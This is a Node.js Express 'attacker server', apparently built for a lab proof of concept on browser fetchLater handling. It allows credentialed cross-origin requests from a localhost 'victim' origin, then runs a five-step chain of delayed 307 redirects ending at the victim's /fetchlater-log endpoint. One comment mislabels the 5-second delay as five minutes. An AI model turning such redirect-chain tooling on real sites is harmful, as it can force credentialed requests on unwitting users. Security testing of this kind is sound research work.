const express = require('express');
const cors = require('cors');
const WebSocket = require('ws');
const app = express();

let wsClient = null;

function connectToWebSocketServer() {
  wsClient = new WebSocket('ws://websocket-server:3000');

  wsClient.on('open', () => {
    console.log('Backend connected to WebSocket server');
  });

  wsClient.on('error', (error) => {
    console.error('WebSocket connection error:', error);
  });

  wsClient.on('close', () => {
    console.log('WebSocket connection closed, attempting to reconnect...');
    setTimeout(connectToWebSocketServer, 5000);
  });
}

connectToWebSocketServer();

function broadcastToWebSocket(data) {
  if (wsClient && wsClient.readyState === WebSocket.OPEN) {
    wsClient.send(JSON.stringify(data));
  }
}

const victim_origin = 'https://localhost:8443';

app.use(cors({
  origin: `${victim_origin}`,
  credentials: true
}));

const REDIRECT_CHAIN_LENGTH = 5;
const MAX_DELAY = 5000; // 300 seconds in ms (5 minutes)
const TARGET_URL = `${victim_origin}/fetchlater-log`;


app.post('/start', (req, res) => {
  console.log('Starting redirect chain...');
  res.redirect(307,'/redirect/0');
});

app.post('/redirect/:step', async (req, res, next) => {
  const step = parseInt(req.params.step);
  console.log(`Redirect step ${step} started`, req.headers);
    
  broadcastToWebSocket({
    type: 'redirect-count',
    data: JSON.stringify({step: step, chain: REDIRECT_CHAIN_LENGTH, delay : MAX_DELAY})
  });
  await new Promise(resolve => setTimeout(resolve, MAX_DELAY));
  console.log(`Redirect step ${step} completed, redirecting...`, req.headers);

  res.header('Access-Control-Allow-Origin', victim_origin );
  res.header('Access-Control-Allow-Credentials', 'true');

  try {
    if (step < REDIRECT_CHAIN_LENGTH - 1) {
      console.log(`Redirecting step ${step + 1}...`);
      res.redirect(307, `/redirect/${step + 1}`);
    } else {
      console.log(`[DEBUG] About to redirect to final target: ${TARGET_URL}`);
      console.log(`[DEBUG] Response headers before redirect:`, res.getHeaders());
      res.redirect(307, TARGET_URL);
      console.log(`[DEBUG] Redirect to ${TARGET_URL} sent`);
    }
  } catch (err) {
    console.error(`[ERROR] Exception during redirect:`, err);
    next(err);
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(`[ERROR] Uncaught error:`, err);
  res.status(500).send('Internal Server Error');
});

app.listen(5000, () => {
  console.log('JS Attacker server running on port 5000');
});
